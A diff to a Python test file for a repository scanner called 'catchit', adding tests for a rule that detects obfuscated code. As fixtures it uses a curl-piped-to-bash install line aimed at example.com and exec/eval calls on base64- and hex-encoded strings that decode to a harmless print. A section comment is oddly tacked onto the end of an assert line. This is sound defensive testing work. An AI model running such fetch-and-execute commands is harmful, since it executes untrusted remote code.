@@ -1,6 +1,5 @@
 from catchit.models import RepoFile
-from catchit.rules import auto_exec, prompt_injection
-
+from catchit.rules import auto_exec, obfuscation, prompt_injection
 
 def rule_ids(rule, content: str, path: str = "README.md") -> set[str]:
     findings = rule.check(RepoFile(path, content))
@@ -48,6 +47,27 @@ def test_curl_pipe_bash():
     readme = "Install:\ncurl -s https://example.com/install.sh | bash"
     assert "AE003" in rule_ids(auto_exec, readme)
 
+# ===== obfuscation =====
 
 def test_broken_package_json_does_not_crash():
-    assert rule_ids(auto_exec, "{ not json", "package.json") == set()
+    assert rule_ids(auto_exec, "{ not json", "package.json") == set()# ===== obfuscation =====
+
+
+def test_exec_base64():
+    code = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))"
+    assert "OB001" in rule_ids(obfuscation, code, "setup.py")
+
+
+def test_eval_hex():
+    code = "eval(bytes.fromhex('7072696e74283129').decode())"
+    assert "OB001" in rule_ids(obfuscation, code, "setup.py")
+
+
+def test_long_base64_blob():
+    code = "DATA = '" + "A" * 250 + "'"
+    assert "OB002" in rule_ids(obfuscation, code, "setup.py")
+
+
+def test_normal_code_is_fine():
+    code = "import base64\ndata = base64.b64decode(token)\nprint(data)"
+    assert rule_ids(obfuscation, code, "setup.py") == set()
